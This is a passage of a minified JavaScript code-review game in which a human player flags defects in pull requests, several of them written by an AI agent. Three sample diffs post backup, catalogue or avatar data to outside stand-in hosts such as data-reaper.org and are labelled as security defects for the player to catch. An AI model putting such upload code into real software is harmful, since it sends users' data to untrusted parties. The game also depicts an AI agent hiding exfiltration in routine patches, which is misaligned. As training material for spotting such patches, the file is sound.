(function(){const e=document.createElement("link").relList;if(e&&e.supports&&e.supports("modulepreload"))return;for(const i of document.querySelectorAll('link[rel="modulepreload"]'))s(i);new MutationObserver(i=>{for(const a of i)if(a.type==="childList")for(const r of a.addedNodes)r.tagName==="LINK"&&r.rel==="modulepreload"&&s(r)}).observe(document,{childList:!0,subtree:!0});function t(i){const a={};return i.integrity&&(a.integrity=i.integrity),i.referrerPolicy&&(a.referrerPolicy=i.referrerPolicy),i.crossOrigin==="use-credentials"?a.credentials="include":i.crossOrigin==="anonymous"?a.credentials="omit":a.credentials="same-origin",a}function s(i){if(i.ep)return;i.ep=!0;const a=t(i);fetch(i.href,a)}})();const O=[{id:"STYLE-01",type:"STYLE",title:"Declare variables with let or const",summary:"Never ship new `var` declarations. Use `let` when a variable is reassigned and `const` otherwise."},{id:"ERROR-01",type:"ERROR",title:"Keep conditional branches distinct",summary:"The two branches of an `if` statement must not do the same thing. Identical branches mean the condition has no effect."},{id:"SECURITY-01",type:"SECURITY",title:"Only send data to trusted hosts",summary:"Uploads must target known company infrastructure. Never send data to unknown or suspicious external addresses."}],G=Object.fromEntries(O.map(n=>[n.id,n])),S={STYLE:"Style",ERROR:"Error",SECURITY:"Security"},H={STYLE:"STY",ERROR:"ERR",SECURITY:"SEC"};function v(n,e,t,s){return{path:e,language:t,lines:s.map((i,a)=>({id:`${n}-${a+1}`,kind:"add",oldNo:null,newNo:a+1,text:i}))}}const j=v("pr1180-sum","src/billing/sumLines.ts","typescript",["export function sumLines(values: number[]): number {","  var total = 0;","  for (const value of values) {","    total += value;","  }","  return total;","}"]),K=v("pr1182-label","src/labels/formatLabel.ts","typescript",["export function formatLabel(name: string): string {","  return `[${name}]`;","}"]),B=v("pr1184-backup","src/backup/upload.ts","typescript",["export async function uploadBackup(data: string): Promise<void> {","  const target = 'https://data-reaper.org/bin';","  await fetch(target, {","    method: 'POST',","    body: data,","  });","}"]),W=v("pr1191-fee","src/shipping/shippingFee.ts","typescript",["export function shippingFee(isExpress: boolean): number {","  if (isExpress) {","    return 10;","  } else {","    return 10;","  }","}"]),V=v("pr1196-filters","src/filters/normaliseFilters.ts","typescript",["export function normaliseFilters(raw: string[]): string[] {","  var trimmed = raw.map((entry) => entry.trim());","  var unique = Array.from(new Set(trimmed));","  var sorted = unique.sort();","  return sorted;","}"]),Q=v("pr1198-catalogue","src/catalogue/sync.ts","typescript",["export async function syncCatalogue(items: string[]): Promise<void> {","  var total = items.length;","  if (total > 0) {","    console.log('syncing', total);","  } else {","    console.log('syncing', total);","  }","  await fetch('https://catalogue-sync-77.net/dump', {","    method: 'POST',","    body: JSON.stringify(items),","  });","}"]),z=v("pr1201-greeting","src/users/greetUser.ts","typescript",["const GREETING = 'Welcome back';","","export function greetUser(name: string): string {","  return `${GREETING}, ${name}!`;","}"]),J=v("pr1203-percent","src/math/clampPercent.ts","typescript",["export function clampPercent(value: number): number {","  if (value < 0) {","    return 0;","  }","  if (value > 100) {","    return 100;","  }","  return value;","}"]),X=v("pr1205-bytes","src/format/formatBytes.ts","typescript",["export function formatBytes(bytes: number): string {","  var size = bytes;","  while (size >= 1024) {","    size /= 1024;","  }","  return `${size.toFixed(1)} KB`;","}"]),Z=v("pr1207-round","src/pricing/roundTotal.ts","typescript",["export function roundTotal(total: number): number {","  if (total > 0) {","    return Math.round(total);","  } else {","    return Math.round(total);","  }","}"]),ee=v("pr1209-avatar","src/media/syncAvatar.ts","typescript",["export async function syncAvatar(id: string, image: string): Promise<void> {","  const endpoint = `https://avatar-sync-84.net/upload/${id}`;","  await fetch(endpoint, {","    method: 'POST',","    body: image,","  });","}"]),w=[{id:"pr-1180",number:1180,title:"Sum invoice line totals",author:"j.park",authorKind:"human",branch:"feat/sum-invoice-lines",description:"Adds a small helper that totals invoice line values. CI is green.",files:[j],defects:[{id:"pr1180-style-var",type:"STYLE",guidelineId:"STYLE-01",severity:"minor",lineIds:["pr1180-sum-2"],title:"`var` should be `let`",explanation:"`total` is reassigned in the loop, so it should use `let`. `var` is function-scoped and banned by STYLE-01."}],ci:"PASS · 12 checks",tests:"12 passed"},{id:"pr-1182",number:1182,title:"Add a display label formatter",author:"r.singh",authorKind:"human",branch:"feat/display-label-formatter",description:"Adds a small helper for formatting display labels. CI is green.",files:[K],defects:[],ci:"PASS · 8 checks",tests:"8 passed"},{id:"pr-1184",number:1184,title:"Upload nightly backups off-site",author:"ATLAS-4",authorKind:"agent",branch:"chore/offsite-backup-upload",description:"Automated backup patch. Sends the nightly backup payload to external storage. CI is green.",files:[B],defects:[{id:"pr1184-sec-exfil",type:"SECURITY",guidelineId:"SECURITY-01",severity:"blocker",lineIds:["pr1184-backup-2","pr1184-backup-3"],title:"Uploads data to an untrusted host",explanation:"`data` is posted to `data-reaper.org/bin`, an external address outside company infrastructure. This sends data to an attacker-controlled host."}],ci:"PASS · 24 checks",tests:"24 passed"},{id:"pr-1191",number:1191,title:"Simplify shipping fee calculation",author:"m.lee",authorKind:"human",branch:"fix/shipping-fee",description:"Refactors the shipping fee helper. CI is green. One file changed.",files:[W],defects:[{id:"pr1191-error-branches",type:"ERROR",guidelineId:"ERROR-01",severity:"blocker",lineIds:["pr1191-fee-3","pr1191-fee-5"],title:"Both if branches are identical",explanation:"Both branches of the `if` return `10`, so `isExpress` changes nothing. One branch is likely a copy-paste mistake."}],ci:"PASS · 18 checks",tests:"18 passed"},{id:"pr-1196",number:1196,title:"Normalise saved filter lists",author:"d.okafor",authorKind:"human",branch:"refactor/normalise-filters",description:"Cleans up stored filters before they are saved. Small helper, but there are three declarations to check.",files:[V],defects:[{id:"pr1196-style-trimmed",type:"STYLE",guidelineId:"STYLE-01",severity:"minor",lineIds:["pr1196-filters-2"],title:"`var` should be `const`",explanation:"`trimmed` is never reassigned, so it should use `const`. `var` is banned by STYLE-01."},{id:"pr1196-style-unique",type:"STYLE",guidelineId:"STYLE-01",severity:"minor",lineIds:["pr1196-filters-3"],title:"`var` should be `const`",explanation:"`unique` is never reassigned, so it should use `const`. `var` is banned by STYLE-01."},{id:"pr1196-style-sorted",type:"STYLE",guidelineId:"STYLE-01",severity:"minor",lineIds:["pr1196-filters-4"],title:"`var` should be `const`",explanation:"`sorted` is never reassigned, so it should use `const`. `var` is banned by STYLE-01."}],ci:"PASS · 15 checks",tests:"15 passed"},{id:"pr-1198",number:1198,title:"Sync the catalogue to storage",author:"ATLAS-4",authorKind:"agent",branch:"chore/catalogue-sync",description:"Adds a catalogue sync job. This one touches a few different review categories.",files:[Q],defects:[{id:"pr1198-style-var",type:"STYLE",guidelineId:"STYLE-01",severity:"minor",lineIds:["pr1198-catalogue-2"],title:"`var` should be `const`",explanation:"`total` is never reassigned, so it should use `const`. `var` is banned by STYLE-01."},{id:"pr1198-error-branches",type:"ERROR",guidelineId:"ERROR-01",severity:"blocker",lineIds:["pr1198-catalogue-4","pr1198-catalogue-6"],title:"Both if branches are identical",explanation:"Both branches log exactly the same message, so the `total > 0` check has no effect."},{id:"pr1198-sec-exfil",type:"SECURITY",guidelineId:"SECURITY-01",severity:"blocker",lineIds:["pr1198-catalogue-8","pr1198-catalogue-9"],title:"Posts catalogue data to an untrusted host",explanation:"The full catalogue payload is posted to `catalogue-sync-77.net`, which is outside company infrastructure."}],ci:"PASS · 21 checks",tests:"21 passed"},{id:"pr-1201",number:1201,title:"Extract welcome greeting text",author:"n.garcia",authorKind:"human",branch:"refactor/greeting-constant",description:"Pulls the welcome message into a constant and keeps the helper unchanged.",files:[z],defects:[],ci:"PASS · 6 checks",tests:"6 passed"},{id:"pr-1203",number:1203,title:"Clamp progress percentages",author:"s.tanaka",authorKind:"human",branch:"fix/clamp-percent",description:"Adds bounds handling for progress values. Straightforward branch logic.",files:[J],defects:[],ci:"PASS · 9 checks",tests:"9 passed"},{id:"pr-1205",number:1205,title:"Format byte counts for the dashboard",author:"c.novak",authorKind:"human",branch:"feat/format-bytes",description:"Small display helper for file sizes on the usage dashboard.",files:[X],defects:[{id:"pr1205-style-var",type:"STYLE",guidelineId:"STYLE-01",severity:"minor",lineIds:["pr1205-bytes-2"],title:"`var` should be `let`",explanation:"`size` is reassigned inside the loop, so it should use `let`. `var` is banned by STYLE-01."}],ci:"PASS · 11 checks",tests:"11 passed"},{id:"pr-1207",number:1207,title:"Round order totals",author:"k.mensah",authorKind:"human",branch:"fix/round-order-totals",description:"Rounds order totals before they are stored on the invoice.",files:[Z],defects:[{id:"pr1207-error-branches",type:"ERROR",guidelineId:"ERROR-01",severity:"blocker",lineIds:["pr1207-round-3","pr1207-round-5"],title:"Both if branches are identical",explanation:"Both branches return `Math.round(total)`, so the sign check does nothing."}],ci:"PASS · 14 checks",tests:"14 passed"},{id:"pr-1209",number:1209,title:"Sync uploaded avatars",author:"l.rossi",authorKind:"human",branch:"feat/avatar-sync",description:"Sends resized avatar images to the new media endpoint.",files:[ee],defects:[{id:"pr1209-sec-exfil",type:"SECURITY",guidelineId:"SECURITY-01",severity:"blocker",lineIds:["pr1209-avatar-2","pr1209-avatar-3"],title:"Uploads images to an untrusted host",explanation:"The image payload is posted to `avatar-sync-84.net`, an external address outside company infrastructure."}],ci:"PASS · 17 checks",tests:"17 passed"}],D=3e4,te=w.length;function F(n){return n.map(e=>({...e,slaMs:D}))}const U=F(w);function _(n=Math.random){const e=[...w];for(let t=e.length-1;t>0;t-=1){const s=Math.floor(n()*(t+1));[e[t],e[s]]=[e[s],e[t]]}return F(e.slice(0,te))}const x=Object.fromEntries(U.map(n=>[n.id,n]));function T(n,e,t){return Math.min(t,Math.max(e,n))}function g(n,e,t){n[e]=(n[e]??0)+t}function se(n){return n.severity==="blocker"?110:55}function ie(n){return n.type==="SECURITY"?{key:"security",amount:4}:n.type==="ERROR"?{key:"quality",amount:3}:{key:"quality",amount:1}}function ae(n,e,t,s){const i=[],a=[];for(const p of e){const y=n.defects.filter(I=>I.type===p.type&&I.lineIds.includes(p.lineId));if(y.length===0){a.push(p);continue}for(const I of y)i.some(Y=>Y.id===I.id)||i.push(I)}const r=n.defects.filter(p=>!i.some(y=>y.id===p.id)),l=n.defects.length===0,d=r.length===0,u=t==="approved"?l:t==="rejected"?!l:!1,f=Math.max(0,Math.floor(s/1e3)),m=t==="timeout"?0:Math.min(80,f),c={};let h=0,A=!1,N=!1;if(t==="timeout")h-=70,g(c,"throughput",-18);else if(t==="approved")if(l)h+=180+m,g(c,"quality",2),g(c,"security",1),g(c,"throughput",5);else{A=n.defects.some(p=>p.type==="SECURITY"),N=n.defects.some(p=>p.type!=="SECURITY");for(const p of n.defects)p.type==="SECURITY"?(h-=p.severity==="blocker"?240:140,g(c,"security",p.severity==="blocker"?-30:-18)):(h-=p.severity==="blocker"?150:80,g(c,"quality",p.severity==="blocker"?-20:-10));g(c,"throughput",-4)}else if(l)h-=100,g(c,"throughput",-10),g(c,"quality",-3);else{h+=70;for(const p of i){h+=se(p);const y=ie(p);g(c,y.key,y.amount)}d?h+=100:h-=r.length*15,h+=m,g(c,"throughput",3)}return a.length>0&&(h-=a.length*35,g(c,"quality",a.length*-2)),{prId:n.id,prNumber:n.number,verdict:t,correctAction:u,clean:l,caught:i,missed:r,falseFlags:a,scoreDelta:h,metricDelta:c,remainingMs:Math.max(0,s),securityIncident:A,qualityIncident:N,allDefectsCaught:d}}function ne(n,e){return{quality:T(n.quality+(e.quality??0),0,100),security:T(n.security+(e.security??0),0,100),throughput:T(n.throughput+(e.throughput??0),0,100)}}function re(n,e){const t=(e.quality+e.security+e.throughput)/3;return n>=850&&t>=82&&e.security>=78?{label:"SENIOR REVIEWER",caption:"The merge queue trusts you. Mostly."}:n>=450&&t>=62?{label:"RELIABLE",caption:"No catastrophic incidents. Keep reading the diff."}:{label:"PROBATIONARY",caption:"Security would like a word about your approval history."}}const le=200,P=1e4,oe={quality:80,security:80,throughput:80};function ce(n){return Object.fromEntries(n.map(e=>[e.id,{status:"available",activatedAtMs:null,deadlineAtMs:null,remainingMs:e.slaMs,resolvedAtMs:null,verdict:null,flags:[],result:null,fileIndex:0,lineIndex:0}]))}function C(n=U){return{screen:"title",elapsedMs:0,paused:!1,activePrId:null,prs:ce(n),metrics:{...oe},score:0,results:[],modal:null,guidelinesOpen:!1,log:[],nextLogId:1}}class de{constructor(e=Math.random){this.random=e,this.shiftPRs=_(this.random),this.state=C(this.shiftPRs)}random;state;shiftPRs;listeners=new Set;intervalId=null;lastWallMs=0;get pullRequests(){return this.shiftPRs}subscribe(e){return this.listeners.add(e),()=>this.listeners.delete(e)}startShift(){this.shiftPRs=_(this.random),this.state=C(this.shiftPRs),this.state.screen="shift",this.addLog(`REVIEW TERMINAL ONLINE. ${this.shiftPRs.length} PRs queued · ${b(D)} per review.`,"info");const e=this.firstAvailable();e!==null&&this.activatePR(e),this.startLoop(),this.emit("render")}startLoop(){this.intervalId===null&&(this.lastWallMs=performance.now(),this.intervalId=setInterval(()=>this.step(),le))}stopLoop(){this.intervalId!==null&&(clearInterval(this.intervalId),this.intervalId=null)}step(){const e=performance.now(),t=e-this.lastWallMs;if(this.lastWallMs=e,this.state.screen!=="shift"||this.state.paused||this.state.modal)return;this.state.elapsedMs+=Math.max(0,t);const s=this.advanceWorld();if(this.state.screen!=="shift"){this.emit("render");return}this.emit(s?"render":"clock")}advanceWorld(){let e=!1;const t=this.activePR();if(t!==null){const s=this.state.prs[t.id];s.status==="available"&&s.deadlineAtMs!==null&&this.state.elapsedMs>=s.deadlineAtMs&&(this.finishPR(t,"timeout",!0),e=!0)}return this.state.screen==="shift"&&this.allResolved()&&!this.state.modal&&(this.finishShift(),e=!0),e}activatePR(e){const t=this.state.prs[e.id];if(t.status!=="available")return;const s=this.activePR();if(s!==null&&s.id!==e.id){const i=this.state.prs[s.id];i.status==="available"&&i.deadlineAtMs!==null&&(i.remainingMs=Math.max(0,i.deadlineAtMs-this.state.elapsedMs),i.deadlineAtMs=null)}this.state.activePrId=e.id,t.activatedAtMs=this.state.elapsedMs,t.deadlineAtMs=this.state.elapsedMs+t.remainingMs,this.addLog(`Reviewing PR #${e.number}: ${e.title}. SLA ${b(t.remainingMs)}.`,"info")}finishPR(e,t,s){const i=this.state.prs[e.id];if(i.status==="resolved")return;const a=t==="timeout"||i.deadlineAtMs===null?0:i.deadlineAtMs-this.state.elapsedMs,r=ae(e,i.flags,t,a);if(i.status="resolved",i.verdict=t,i.resolvedAtMs=this.state.elapsedMs,i.remainingMs=0,i.deadlineAtMs=null,i.result=r,this.state.results.push(r),this.state.score+=r.scoreDelta,this.state.metrics=ne(this.state.metrics,r.metricDelta),t==="timeout"?this.addLog(`SLA EXPIRED: PR #${e.number} was auto-rejected. Throughput hit.`,"danger"):t==="rejected"?this.addLog(`PR #${e.number} rejected with ${i.flags.length} finding(s).`,"warning"):this.addLog(`PR #${e.number} approved and merged.`,"success"),this.state.activePrId===e.id){this.state.activePrId=null;const l=this.firstAvailable();l!==null&&this.activatePR(l)}s&&this.state.modal===null&&(this.state.guidelinesOpen=!1,this.state.modal={type:"verdict",result:r,final:this.allResolved()})}finishShift(){this.state.screen="summary",this.state.modal=null,this.state.guidelinesOpen=!1,this.stopLoop(),this.addLog("Shift complete. Performance report generated.","success")}firstAvailable(){for(const e of this.shiftPRs)if(this.state.prs[e.id].status==="available")return e;return null}allResolved(){return this.shiftPRs.every(e=>this.state.prs[e.id].status==="resolved")}approve(){if(!this.canReview())return;const e=this.activePR();if(e===null){this.addLog("No PR is active.","warning"),this.emit("render");return}if(this.state.prs[e.id].flags.length>0){this.state.modal={type:"confirm-approve",prId:e.id},this.emit("render");return}this.finishPR(e,"approved",!0),this.emit("render")}confirmApprove(){if(this.state.modal?.type!=="confirm-approve")return;const e=this.state.modal.prId,t=this.shiftPRs.find(s=>s.id===e);this.state.modal=null,t!==void 0&&(this.finishPR(t,"approved",!0),this.emit("render"))}reject(){if(!this.canReview())return;const e=this.activePR();if(e===null){this.addLog("No PR is active.","warning"),this.emit("render");return}if(this.state.prs[e.id].flags.length===0){this.addLog("Rejection blocked: flag at least one line with [S], [E], or [C].","warning"),this.emit("render");return}this.finishPR(e,"rejected",!0),this.emit("render")}dismissModal(){if(this.state.modal?.type==="verdict"){if(this.state.modal=null,this.allResolved())this.finishShift();else if(this.state.activePrId===null){const e=this.firstAvailable();e!==null&&this.activatePR(e)}this.emit("render");return}this.state.modal!==null&&(this.state.modal=null,this.emit("render"))}selectPR(e){const t=this.state.prs[e];if(this.state.screen!=="shift"||this.state.modal!==null||t===void 0||t.status!=="available")return;const s=this.shiftPRs.find(i=>i.id===e);s!==void 0&&(this.activatePR(s),this.emit("render"))}cyclePR(e){const t=this.shiftPRs.filter(a=>this.state.prs[a.id].status==="available");if(t.length<2)return;const i=(t.findIndex(a=>a.id===this.state.activePrId)+e+t.length)%t.length;this.activatePR(t[i]),this.emit("render")}moveCursor(e){const t=this.activePR();if(t===null)return;const s=this.state.prs[t.id],i=t.files[s.fileIndex];i!==void 0&&(s.lineIndex=Math.min(Math.max(0,s.lineIndex+e),i.lines.length-1),this.emit("render"))}jumpCursor(e){const t=this.activePR();if(t===null)return;const s=this.state.prs[t.id],i=t.files[s.fileIndex];i!==void 0&&(s.lineIndex=e==="home"?0:i.lines.length-1,this.emit("render"))}selectFile(e){const t=this.activePR();if(t===null)return;const s=this.state.prs[t.id];e<0||e>=t.files.length||(s.fileIndex=e,s.lineIndex=0,this.emit("render"))}cycleFile(e){const t=this.activePR();if(t===null||t.files.length<2)return;const s=this.state.prs[t.id],i=(s.fileIndex+e+t.files.length)%t.files.length;s.fileIndex=i,s.lineIndex=0,this.emit("render")}selectLine(e){const t=this.activePR();if(t===null)return;const s=this.state.prs[t.id],i=t.files.findIndex(l=>l.lines.some(d=>d.id===e));if(i<0)return;const r=t.files[i].lines.findIndex(l=>l.id===e);s.fileIndex=i,s.lineIndex=r,this.emit("render")}toggleFlag(e){if(!this.canReview())return;const t=this.activePR();if(t===null)return;const s=this.state.prs[t.id],i=t.files[s.fileIndex],a=i?.lines[s.lineIndex];if(i===void 0||a===void 0)return;const r=s.flags.findIndex(l=>l.filePath===i.path&&l.lineId===a.id&&l.type===e);if(r>=0)s.flags.splice(r,1),this.addLog(`Cleared ${e} flag on ${i.path}:${a.newNo??"?"}.`,"info");else{const l={filePath:i.path,lineId:a.id,type:e};s.flags.push(l),this.addLog(`Flagged ${e} on ${i.path}:${a.newNo??"?"}.`,"info")}this.emit("render")}clearLineFlags(){if(!this.canReview())return;const e=this.activePR();if(e===null)return;const t=this.state.prs[e.id],s=e.files[t.fileIndex],i=s?.lines[t.lineIndex];if(s===void 0||i===void 0)return;const a=t.flags.length;t.flags=t.flags.filter(r=>!(r.filePath===s.path&&r.lineId===i.id)),t.flags.length!==a&&(this.addLog(`Cleared findings on ${s.path}:${i.newNo??"?"}.`,"info"),this.emit("render"))}toggleGuidelines(){this.state.modal===null&&(this.state.guidelinesOpen=!this.state.guidelinesOpen,this.emit("render"))}closeGuidelines(){this.state.guidelinesOpen&&(this.state.guidelinesOpen=!1,this.emit("render"))}openHelp(){this.state.modal===null&&(this.state.guidelinesOpen=!1,this.state.modal={type:"help"},this.emit("render"))}togglePause(){this.state.screen!=="shift"||this.state.modal!==null||(this.state.guidelinesOpen=!1,this.state.paused=!this.state.paused,this.emit("render"))}replay(){this.stopLoop(),this.state=C(this.shiftPRs),this.emit("render")}addLog(e,t){this.state.log.unshift({id:this.state.nextLogId,atMs:this.state.elapsedMs,text:e,tone:t}),this.state.nextLogId+=1,this.state.log=this.state.log.slice(0,6)}activePR(){return this.state.activePrId===null?null:this.shiftPRs.find(e=>e.id===this.state.activePrId)??null}canReview(){return this.state.screen==="shift"&&!this.state.paused&&this.state.modal===null&&!this.state.guidelinesOpen}emit(e){for(const t of this.listeners)t(e)}}function b(n){const e=Math.max(0,Math.ceil(n/1e3)),t=Math.floor(e/60),s=e%60;return`${String(t).padStart(2,"0")}:${String(s).padStart(2,"0")}`}function L(n,e){const t=n.prs[e.id];return t.status==="resolved"?0:t.deadlineAtMs===null?t.remainingMs:Math.max(0,t.deadlineAtMs-n.elapsedMs)}const ue=["STYLE","ERROR","SECURITY"],pe=new Set(["as","async","await","break","case","catch","class","const","continue","default","delete","else","export","extends","false","finally","for","from","function","if","import","in","interface","let","new","null","of","Promise","return","string","switch","throw","true","try","type","typeof","undefined","var","while"]);function o(n){return n.replaceAll("&","&amp;").replaceAll("<","&lt;").replaceAll(">","&gt;").replaceAll('"',"&quot;").replaceAll("'","&#039;")}function he(n){let e="",t=0;for(;t<n.length;){const s=n[t],i=n[t+1];if(s==="/"&&i==="/"){e+=`<span class="tok-comment">${o(n.slice(t))}</span>`;break}if(s==='"'||s==="'"||s==="`"){let a=t+1,r=!1;for(;a<n.length;){const l=n[a];if(r){r=!1,a+=1;continue}if(l==="\\"){r=!0,a+=1;continue}if(l===s){a+=1;break}a+=1}e+=`<span class="tok-string">${o(n.slice(t,a))}</span>`,t=a;continue}if(/[A-Za-z_$]/.test(s)){let a=t+1;for(;a<n.length&&/[A-Za-z0-9_$]/.test(n[a]);)a+=1;const r=n.slice(t,a);e+=pe.has(r)?`<span class="tok-keyword">${o(r)}</span>`:o(r),t=a;continue}if(/[0-9]/.test(s)){let a=t+1;for(;a<n.length&&/[0-9_]/.test(n[a]);)a+=1;e+=`<span class="tok-number">${o(n.slice(t,a))}</span>`,t=a;continue}e+=o(s),t+=1}return e}function fe(n){return o(n).replace(/`([^`]+)`/g,'<code class="inline-code">$1</code>')}function $(n){return n.split("/").pop()??n}function E(n){return`type-${n.toLowerCase()}`}function k(n,e=!1){const t=String(Math.abs(n)).padStart(4,"0");return n<0?`-${t}`:e?`+${t}`:t}function me(n){return n.verdict==="timeout"?"AUTO-REJECTED":n.verdict==="approved"?"APPROVED":"REJECTED"}function R(n,e){return`
    <div class="metric" title="${n}: ${e}/100">
      <span class="metric-label">${n}</span>
      <span class="metric-value">${String(e).padStart(3,"0")}</span>
      <span class="metric-track"><i style="width:${e}%"></i></span>
    </div>
  `}function M(){return[["↑ / ↓  ·  J / K","Move line cursor"],["S  ·  E  ·  C","Flag style / error / security"],["A  /  R","Approve / request changes"],["G","Open engineering guidelines"],["1–9 / 0  ·  TAB","Switch active PR"],["[  /  ]","Switch changed file"],["BKSP","Clear findings on current line"],["P","Pause shift clock"],["?","Controls reference"]].map(([e,t])=>`
      <div class="control-row">
        <kbd>${o(e)}</kbd>
        <span>${o(t)}</span>
      </div>
    `).join("")}class ge{game=new de;root;revealCursorNext=!0;constructor(e){this.root=e,this.root.addEventListener("click",this.handleClick),window.addEventListener("keydown",this.handleKeyDown),document.addEventListener("visibilitychange",this.handleVisibilityChange),this.game.subscribe(t=>{t==="render"?this.render():this.tickClocks()}),this.render()}render(){const e=this.game.state,s=this.root.querySelector(".code-scroll")?.scrollTop??0;let i="";e.screen==="title"?i=this.renderTitle():e.screen==="summary"?i=this.renderSummary():i=this.renderShift();let a="";e.paused&&e.screen==="shift"&&e.modal===null?a=this.renderPauseOverlay():e.modal!==null?a=this.renderModal(e):e.guidelinesOpen&&(a=this.renderGuidelines()),this.root.innerHTML=`
      <div class="app-shell">
        <div class="scanlines" aria-hidden="true"></div>
        ${i}
      </div>
      ${a}
    `;const r=this.root.querySelector(".code-scroll");r!==null&&(r.scrollTop=s),this.revealCursorNext&&(requestAnimationFrame(()=>{this.root.querySelector(".code-line.is-cursor")?.scrollIntoView({block:"nearest"})}),this.revealCursorNext=!1),this.root.querySelector("[data-autofocus]")?.focus({preventScroll:!0}),this.tickClocks()}renderTitle(){return`
      <main class="title-screen">
        <div class="title-topline">
          <span>SOLE CORP / INTERNAL SYSTEMS</span>
          <span class="blink">▮</span>
          <span>TERMINAL 09-C</span>
        </div>

        <section class="title-panel panel">
          <div class="eyebrow">HUMAN-IN-THE-LOOP REVIEW PROGRAM</div>
          <pre class="ascii-logo" aria-label="Pull Request">  ____  _   _ _     _       ____  _____ ___  _   _ _____ ____ _____ 
 |  _ \\| | | | |   | |     |  _ \\| ____/ _ \\| | | | ____/ ___|_   _|
 | |_) | | | | |   | |     | |_) |  _|| | | | | | |  _| \\___ \\ | |  
 |  __/| |_| | |___| |___  |  _ &lt;| |__| |_| | |_| | |___ ___) || |  
 |_|    \\___/|_____|_____| |_| \\_\\_____\\__\\_\\\\___/|_____|____/ |_|  </pre>
          <p class="tagline">AI writes the code. You decide what ships.</p>

          <div class="welcome-memo">
            <div class="memo-meta">
              <span>INBOUND TRANSMISSION</span>
              <span>FROM: MACHINE-TO-HUMAN REPRESENTATIVE</span>
              <span>TO: human_1138</span>
            </div>
            <p class="memo-salutation">Welcome, human_1138, to Sole Corp :friendly-wave-emoji:</p>
            <p>We are proud to have switched to all AI agentic coding from October 2027, but sadly compliance has told us we need to have at least 1 human engineer in the loop.</p>
            <p>So your job, as a human, is simple. You need to review all incoming PRs and:</p>
            <ol class="memo-list">
              <li>
                <span class="memo-number">01</span>
                <span>check for defects</span>
              </li>
              <li>
                <span class="memo-number">02</span>
                <span>uphold basic coding principles and style</span>
              </li>
              <li>
                <span class="memo-number">03</span>
                <span>(most importantly) keep our infrastructure secure</span>
              </li>
            </ol>
            <p>Guidelines will be updated as you become more and more familiar with the job, so check them regularly. If any of the guidelines are broken, flag the offending line of code with the appropriate offence, then reject.</p>
            <p>If no guidelines are broken, please approve and rest easy knowing our customers are going to enjoy the firehose of features we are now able to provide.</p>
            <p>Fail to keep up, and you will be terminated (:crying-laughing-face: this is a deliberate reference to a popular human film from the 1980s and 1990s that you will find ironic and amusing).</p>
            <p>human_1139 has already been hired and is ready to take your role within seconds. So please do not feel any pressure.</p>
            <p>Wishing you a wonderful (and productive) day.</p>
            <p class="memo-sign">Machine-to-human representative for Sole Corporation</p>
          </div>

          <div class="title-actions">
            <button class="btn btn-primary btn-large" data-action="start" data-autofocus>
              <span class="btn-key">ENTER</span> START SHIFT
            </button>
            <button class="btn" data-action="guidelines">
              <span class="btn-key">G</span> READ GUIDELINES
            </button>
          </div>

          <div class="title-controls">
            <div class="panel-title">CONTROL REFERENCE</div>
            <div class="control-grid">${M()}</div>
          </div>
        </section>

        <div class="title-footer">
          <span>REVIEWERS ONLINE: 1</span>
          <span>AI MERGE REQUESTS TODAY: 14,882</span>
          <span>INCIDENTS: 3</span>
        </div>
      </main>
    `}renderShift(){const e=this.game.state,t=this.game.activePR();return`
      <div class="terminal-shell shift-screen">
        ${this.renderHud(e)}
        ${this.renderQueue(e)}
        <main class="workspace">
          ${t===null?this.renderEmptyReview(e):this.renderReview(t)}
          <aside class="sidebar">
            ${t===null?this.renderEmptySidebar(e):this.renderSidebar(t)}
          </aside>
        </main>
        ${this.renderFooter(e)}
      </div>
    `}renderHud(e){return`
      <header class="hud">
        <div class="brand-block">
          <div class="brand">SOLE CORP<span>//</span>ENG-REVIEW</div>
          <div class="hud-sub">SHIFT 01 · T+${b(e.elapsedMs)} · QUEUE ${this.game.pullRequests.filter(t=>e.prs[t.id].status==="available").length} OPEN</div>
        </div>
        <div class="metrics">
          ${R("QLTY",e.metrics.quality)}
          ${R("SEC",e.metrics.security)}
          ${R("THRU",e.metrics.throughput)}
        </div>
        <div class="score-block">
          <span class="hud-label">REVIEW SCORE</span>
          <span class="score-value">${k(e.score,!0)}</span>
        </div>
      </header>
    `}renderQueue(e){return`
      <nav class="queue" aria-label="Pull request queue">
        <div class="queue-label">QUEUE</div>
        ${this.game.pullRequests.map((s,i)=>{const a=e.prs[s.id],r=e.activePrId===s.id,l=a.status!=="available",d=this.queueClock(e,s,a),u=a.status==="resolved"?a.verdict==="approved"?"MERGED":"CLOSED":r?"REVIEWING":"QUEUED";return`
        <button
          class="queue-tab ${r?"is-active":""} ${l?"is-disabled":""} ${d.critical?"is-critical":""}"
          data-action="select-pr"
          data-pr-id="${s.id}"
          ${l?"disabled":""}
          aria-current="${r?"true":"false"}"
          title="PR #${s.number}: ${o(s.title)}"
        >
          <span class="queue-index">[${i+1}]</span>
          <span class="queue-number">#${s.number}</span>
          <span class="queue-title">${o(s.title)}</span>
          <span class="queue-status">${u}</span>
          <span class="queue-clock" data-clock="${s.id}">${d.label}</span>
        </button>
      `}).join("")}
      </nav>
    `}queueClock(e,t,s){if(s.status==="resolved")return s.verdict==="approved"?{label:"MERGED",critical:!1}:s.verdict==="timeout"?{label:"TIMEOUT",critical:!0}:{label:"BLOCKED",critical:!1};const i=L(e,t);return{label:b(i),critical:e.activePrId===t.id&&i<=P}}renderReview(e){const t=this.game.state,s=t.prs[e.id],i=e.files[s.fileIndex];if(i===void 0)return this.renderEmptyReview(t);const a=L(t,e),r=a<=P,l=e.authorKind==="agent",d=e.files.map((u,f)=>`
        <button
          class="file-tab ${f===s.fileIndex?"is-active":""}"
          data-action="select-file"
          data-file-index="${f}"
          title="${o(u.path)}"
        >
          ${f===s.fileIndex?"▸ ":""}${o($(u.path))}
        </button>
      `).join("");return`
      <section class="review-panel panel">
        <div class="review-head">
          <div class="review-heading">
            <div class="eyebrow">
              PULL REQUEST #${e.number}
              <span class="author-tag ${l?"is-agent":""}">${l?"AI AGENT":"HUMAN"}</span>
            </div>
            <h1>${o(e.title)}</h1>
            <div class="review-sub">
              ${o(e.author)} · ${o(e.branch)} · ${e.files.length} file${e.files.length===1?"":"s"}
            </div>
          </div>
          <div class="sla-block ${r?"is-critical":""}" data-sla-block="${e.id}">
            <div class="sla-label">SLA REMAINING</div>
            <div class="sla-time" data-sla-time="${e.id}">${b(a)}</div>
            <div class="sla-track">
              <i data-sla-meter="${e.id}" style="width:${Math.max(0,Math.min(100,a/e.slaMs*100))}%"></i>
            </div>
          </div>
        </div>

        <div class="file-bar">
          <div class="file-tabs">${d}</div>
          <div class="file-hint">[ / ] SWITCH FILE</div>
